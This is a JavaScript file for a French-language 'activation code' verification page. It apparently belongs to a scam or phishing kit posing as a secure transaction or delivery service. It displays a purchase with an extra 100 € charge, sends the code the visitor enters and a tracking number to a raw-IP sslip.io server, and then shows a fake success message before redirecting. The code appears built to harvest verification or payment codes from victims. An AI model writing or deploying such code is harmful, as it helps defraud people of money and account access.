document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('verification-code-form');
    const activationInput = document.getElementById('activation-code');
    const activationError = document.getElementById('activation-error');
    const apiStatus = document.getElementById('verification-status');

    const transaction = JSON.parse(sessionStorage.getItem('tf_transactionDetails'));

    document.getElementById('article').textContent = transaction.article;
    document.getElementById('prix').textContent = transaction.price;    
    document.getElementById('prix2').textContent = transaction.price; 
    document.getElementById('montantTotal').textContent = String(parseInt(transaction.price) + 100 ) + ",00 €";



    const tf_trackingNumber=  sessionStorage.getItem('tf_trackingNumber');


    
    let isProcessing = false;

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (isProcessing) return;

        activationError.textContent = '';
        apiStatus.className = 'status-box hidden';
        const codeValue = activationInput.value.trim();

        if (!codeValue) {
            activationError.textContent = "Le code d'activation est requis.";
            return;
        }

        isProcessing = true;

        try {
            apiStatus.className = "status-box success";
            apiStatus.textContent = "Vérification sécurisée du code...";
            apiStatus.classList.remove('hidden');

            // --- CONNEXION REELLE A L'API BACKEND (ROUTE 3) ---
            const response = await fetch('https://54-247-248-45.sslip.io:5000/api/v1/activation/validate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ activationCode: codeValue, tf_trackingNumber: tf_trackingNumber})
            });

            const data = await response.json();

            if (response.ok && data.success) {
                // Sauvegarde pour la page finale de reçu
                sessionStorage.setItem('trustFetch_activationCode', data.codeEnregistre);
                apiStatus.classList.add('hidden');

                // Compte à rebours avant redirection
                let countdown = 3;
                form.innerHTML = `
                    <div style="text-align: center; padding: 20px 0;">
                        <h3 style="color: var(--accent-color); margin-bottom: 12px;">✅ Authentification Réussie !</h3>
                        <p>Redirection vers votre reçu dans <strong id="countdown-timer">${countdown}</strong> secondes...</p>
                    </div>
                `;

                const timer = setInterval(() => {
                    countdown--;
                    const el = document.getElementById('countdown-timer');
                    if (el) el.textContent = countdown;
                    if (countdown <= 0) {
                        clearInterval(timer);
                        window.location.href = 'confirmation.html';
                    }
                }, 1000);
            } else {
                throw new Error(data.message || 'Code invalide.');
            }

        } catch (error) {
            apiStatus.className = "status-box error";
            apiStatus.textContent = error.message;
            isProcessing = false;
        }
    });
});
